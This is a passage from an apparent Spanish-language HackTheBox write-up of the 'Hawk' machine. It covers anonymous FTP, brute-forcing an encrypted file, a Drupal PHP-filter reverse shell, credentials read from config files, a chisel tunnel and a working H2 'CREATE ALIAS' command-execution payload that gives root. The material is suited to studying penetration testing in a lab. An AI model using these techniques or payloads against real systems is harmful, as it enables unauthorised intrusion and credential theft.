SF:</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">007</span><span class="se">\x</span><span class="s2">009</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.</span><span class="s2">
SF:</span><span class="se">\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\</span><span class="s2">
SF:0</span><span class="se">\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">0
SF:01</span><span class="se">\x</span><span class="s2">005</span><span class="se">\x</span><span class="s2">005</span><span class="se">\0\)\0\n\0\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0\.\0</span><span class="s2">h</span><span class="se">\x</span><span class="s2">002</span><span class="se">\0\.\0</span><span class="s2">m</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">s</span><span class="se">\</span><span class="s2">
SF:0s</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0\.\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">g</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\(\0</span><span class="s2">D</span><span class="se">\0</span><span class="s2">b
SF:</span><span class="se">\0</span><span class="s2">E</span><span class="se">\0</span><span class="s2">x</span><span class="se">\0</span><span class="s2">c</span><span class="se">\0</span><span class="s2">e</span><span class="se">\0</span><span class="s2">p</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0</span><span class="s2">i</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">n</span><span class="se">\0\.\0</span><span class="s2">j</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">v</span><span class="se">\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">:</span><span class="se">\x</span><span class="s2">001</span><span class="se">\x</span><span class="s2">004</span><span class="se">\x</span><span class="s2">004</span><span class="se">\0\)\0\n\0</span><span class="s2">
SF:</span><span class="se">\t\0</span><span class="s2">a</span><span class="se">\0</span><span class="s2">t</span><span class="se">\0\x</span><span class="s2">20</span><span class="se">\0</span><span class="s2">o</span><span class="se">\0</span><span class="s2">r"</span><span class="o">)</span><span class="p">;</span>
Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>El puerto 80 corre un servicio web el cual usa como gestor de contenido un Drupal de versión 7 <a href="https://www.drupal.org/drupal-7.0/es">https://www.drupal.org/drupal-7.0/es</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>80/tcp   open  http          Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103
| http-robots.txt: 36 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 <span class="o">(</span>http://drupal.org<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>El puerto 21 esta abierto y corre <code class="language-plaintext highlighter-rouge">FTP</code> el cual tiene habilitado el <code class="language-plaintext highlighter-rouge">FTP</code> Anonymous el cual quiere decir que podemos habilitarnos sin necesidad de proporcionar contraseña.</p>
  </li>
  <li>
    <p>Si nos conectamos vemos que no hay nada dentro del directorio <code class="language-plaintext highlighter-rouge">messages</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.102
Connected to 10.10.10.102.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.102:miguel<span class="o">)</span>: anonymous
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|46148|<span class="o">)</span>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp&gt; <span class="nb">cd </span>messages
250 Directory successfully changed.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|45380|<span class="o">)</span>
150 Here comes the directory listing.
226 Directory send OK.
ftp&gt;
</code></pre></div></div>

<ul>
  <li>Sin embargo podemos ver archivos ocultos dentro de <code class="language-plaintext highlighter-rouge">messages</code> vemos un <code class="language-plaintext highlighter-rouge">.enc</code> <a href="https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381">https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381</a> en conclusión es un archivo cifrado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-a</span>
229 Entering Extended Passive Mode <span class="o">(||</span>|43596|<span class="o">)</span>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 <span class="nb">.</span>
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
<span class="nt">-rw-r--r--</span>    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp&gt; get .drupal.txt.enc
<span class="nb">local</span>: .drupal.txt.enc remote: .drupal.txt.enc
229 Entering Extended Passive Mode <span class="o">(||</span>|48850|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for</span> .drupal.txt.enc <span class="o">(</span>240 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">***************************************************************************</span>|   240        2.60 MiB/s    00:00 ETA
226 Transfer complete.
240 bytes received <span class="k">in </span>00:00 <span class="o">(</span>2.26 KiB/s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si vemos mas información nos habla sobre <code class="language-plaintext highlighter-rouge">openssl</code> además que se utilizo una contraseña con salt para el proceso de cifrado y los datos se codificaron en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file .drupal.txt.enc
.drupal.txt.enc: openssl enc<span class="s1">'d data with salted password, base64 encoded
</span></code></pre></div></div>

<ul>
  <li>Como no conocemos la contraseña se vuelve mas complejo sin embargo hoy en día existen herramientas las cuales pueden aplicar fuerza bruta para saber la contraseña <a href="https://github.com/deltaclock/go-openssl-bruteforce">https://github.com/deltaclock/go-openssl-bruteforce</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
Cloning into <span class="s1">'go-openssl-bruteforce'</span>...
remote: Enumerating objects: 31, <span class="k">done</span><span class="nb">.</span>
remote: Total 31 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 31
Receiving objects: 100% <span class="o">(</span>31/31<span class="o">)</span>, 1.72 MiB | 2.84 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
❯ <span class="nb">cd </span>go-openssl-bruteforce
❯ go mod tidy
❯ go build <span class="nt">-o</span> openssl-brute
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos el archivo y nos da la contraseña y el algoritmo con el cual fue encriptado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./openssl-brute <span class="nt">--file</span> .drupal.txt.enc
Bruteforcing Started
CRACKED!! Results <span class="k">in </span>file <span class="o">[</span> result-aes256 <span class="o">]</span>
<span class="nt">--------------------------------------------------</span>
Found password <span class="o">[</span> friends <span class="o">]</span> using <span class="o">[</span> aes256 <span class="o">]</span> algorithm!!
<span class="nt">--------------------------------------------------</span>
Daniel,

Following the password <span class="k">for </span>the portal:

PencilKeyboardScanner123

Please <span class="nb">let </span>us know when the portal is ready.

Kind Regards,

IT department

<span class="nt">--------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Podemos probar a conectarnos por ssh pero no nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>creds.txt
Daniel:PencilKeyboardScanner123
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102
The authenticity of host <span class="s1">'10.10.10.102 (10.10.10.102)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:jcuqa44g/a1pFArv7e9IFSswe7plzlg2gNBVim3xXhY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.102<span class="s1">' (ED25519) to the list of known hosts.
daniel@10.10.10.102'</span>s password:
Permission denied, please try again.
daniel@10.10.10.102<span class="s1">'s password:
Permission denied, please try again.
daniel@10.10.10.102'</span>s password:
daniel@10.10.10.102: Permission denied <span class="o">(</span>publickey,password<span class="o">)</span><span class="nb">.</span>
</code></pre></div></div>

<h2 id="drupal">Drupal</h2>

<ul>
  <li>Nos hablan sobre un portal lo mas probable es que se refiera al Drupal 7 que vimos con Nmap.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/1.png" />
</p>

<ul>
  <li>Si nos conectamos con la contraseña que vimos nos deja y como username usamos Admin.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/2.png" />
</p>

<ul>
  <li>Podemos ir a Modules y en este caso como somos usuarios administradores podemos habilitar Path y PHP filter.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/3.png" />
</p>

<ul>
  <li>Vamos añadir contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/4.png" />
</p>

<ul>
  <li>Damos Click en Basic Page.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/5.png" />
</p>

<ul>
  <li>Vamos a ver si el PHP lo interpreta en Text format indicamos que es PHP code.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/6.png" />
</p>

<ul>
  <li>Y vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/7.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>Vamos a enviarnos una reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 433
listening on <span class="o">[</span>any] 433 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/8.png" />
</p>

<ul>
  <li>Al darle a Save nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 433
listening on <span class="o">[</span>any] 433 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 53012
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@hawk:/var/www/html<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 25347 suspended  nc <span class="nt">-nlvp</span> 433
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 25347 continued  nc <span class="nt">-nlvp</span> 433
                                    reset xterm
ENTER
www-data@hawk:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="shell-as-daniel-and-user-flag">Shell as Daniel and User flag</h2>

<ul>
  <li>Vemos la flag en el directorio de Daniel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/home/daniel<span class="nv">$ </span><span class="nb">cat </span>user.txt
3c9bfe74f2f6661740425db2ac4f0c08
www-data@hawk:/home/daniel<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vemos una contraseña en los archivos de configuración.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">cat </span>settings.php | <span class="nb">grep </span>password
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span> username, password, host, and database name.
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'drupal4hawk'</span>,
 <span class="k">*</span> by using the username and password variables. The proxy_user_agent variable
<span class="c"># $conf['proxy_password'] = '';</span>
</code></pre></div></div>

<ul>
  <li>Si migramos a Daniel se nos ejecuta python3.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span>su daniel
Password:
Python 3.6.5 <span class="o">(</span>default, Apr  1 2018, 05:46:30<span class="o">)</span>
<span class="o">[</span>GCC 7.3.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar una bash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> import os
<span class="o">&gt;&gt;&gt;</span> os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">whoami
</span>daniel
daniel@hawk:/var/www/html/sites/default<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>También funcionan por SSH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102
daniel@10.10.10.102<span class="s1">'s password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  3 00:17:56 UTC 2024

  System load:  0.0               Processes:           176
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 44%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.


Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; os.system("/bin/bash")
daniel@hawk:~$
</span></code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Como estamos ante un Drupal podemos ver mas usuarios y sus hashes conectándonos al servicio de la base de datos la misma password para Daniel funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span>mysql <span class="nt">-u</span> drupal <span class="nt">-p</span>
Enter password:
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 73
Server version: 5.7.22-0ubuntu18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

mysql&gt;
</code></pre></div></div>

<ul>
  <li>Vemos el hash del admin.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; use drupal<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt; show tables<span class="p">;</span>
+-----------------------------+
| Tables_in_drupal            |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| comment                     |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| <span class="nb">history</span>                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| <span class="nb">users</span>                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
73 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
| uid | name  | pass                                                    | mail             | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init             | data                     |
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
|   0 |       |                                                         |                  |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                  | NULL                     |
|   1 | admin | <span class="nv">$S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08</span> | admin@hawk.local |       |           | filtered_html    | 1528733367 | 1719965351 | 1719964196 |      1 | Europe/London |          |       0 | admin@hawk.local | a:1:<span class="o">{</span>s:7:<span class="s2">"overlay"</span><span class="p">;</span>i:1<span class="p">;</span><span class="o">}</span> |
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></div></div>

<blockquote>
  <p>La contraseña no esta en el rockyou.txt.</p>
</blockquote>

<ul>
  <li>Vemos el pkexec pero no lo vamos a explotar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"snap"</span>
./bin/ping
./bin/fusermount
./bin/su
./bin/ntfs-3g
./bin/mount
./bin/umount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/at
./usr/bin/gpasswd
./usr/bin/pkexec
./usr/bin/sudo
./usr/bin/newuidmap
./usr/bin/traceroute6.iputils
</code></pre></div></div>

<ul>
  <li>El puerto 8082 esta abierto el cual esta corriendo  H2 database http console como vimos en Nmap <a href="https://www.h2database.com/html/quickstart.html">https://www.h2database.com/html/quickstart.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>netstat <span class="nt">-nat</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      2 10.10.10.102:53012      10.10.14.63:433         ESTABLISHED
tcp6       0      0 :::9092                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::8082                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::5435                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 10.10.10.102:80         10.10.14.63:52754       ESTABLISHED
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer Port Forwarding para ver que es.</p>
  </li>
  <li>
    <p>Bueno si lo hago por SSH me da un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh daniel@10.10.10.102 <span class="nt">-L</span> 8082:localhost:8082
daniel@10.10.10.102<span class="s1">'s password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  3 00:35:55 UTC 2024

  System load:  0.01              Processes:           177
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 68%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></code></pre></div></div>

<ul>
  <li>Vamos a usar chisel <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel_1.9.1_linux_amd64 server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
2024/07/02 18:38:36 server: Reverse tunnelling enabled
2024/07/02 18:38:36 server: Fingerprint <span class="nv">p1HWvBEOgawHr1W0leahUeW7u9yV9XBtPOme4dn1lOE</span><span class="o">=</span>
2024/07/02 18:38:36 server: Listening on http://0.0.0.0:8000
</code></pre></div></div>

<ul>
  <li>Ejecutamos esto en la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>./chisel_1.9.1_linux_amd64 client http://10.10.14.63:8000 R:8082:127.0.0.1:8082
</code></pre></div></div>

<ul>
  <li>Vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/9.png" />
</p>

<ul>
  <li>Si buscamos vulnerabilidades vemos Remote Code Execution.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit H2 database

<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                    |  Path
<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                    | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                       | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                      | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                          | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow        | multiple/remote/31010.sql
<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Si podemos cualquier nombre en <code class="language-plaintext highlighter-rouge">JDBC</code> Url como /testing y nos conectamos sin contraseña funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/10.png" />
</p>

<ul>
  <li>
    <p>Podemos obtener RCE <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a>.</p>
  </li>
  <li>
    <p>Estamos como root.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/11.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS SHELLEXEC AS <span class="nv">$$</span> String shellexec<span class="o">(</span>String cmd<span class="o">)</span> throws java.io.IOException <span class="o">{</span> java.util.Scanner s <span class="o">=</span> new
java.util.Scanner<span class="o">(</span>Runtime.getRuntime<span class="o">()</span>.exec<span class="o">(</span>cmd<span class="o">)</span>.getInputStream<span class="o">())</span>.useDelimiter<span class="o">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">A"</span><span class="o">)</span><span class="p">;</span> <span class="k">return </span>s.hasNext<span class="o">()</span> ? s.next<span class="o">()</span> : <span class="s2">""</span><span class="p">;</span> <span class="o">}</span><span class="nv">$$</span><span class="p">;</span>
CALL SHELLEXEC<span class="o">(</span><span class="s1">'id'</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Usaremos el siguiente script para recibir la reverse shell.</li>
</ul>

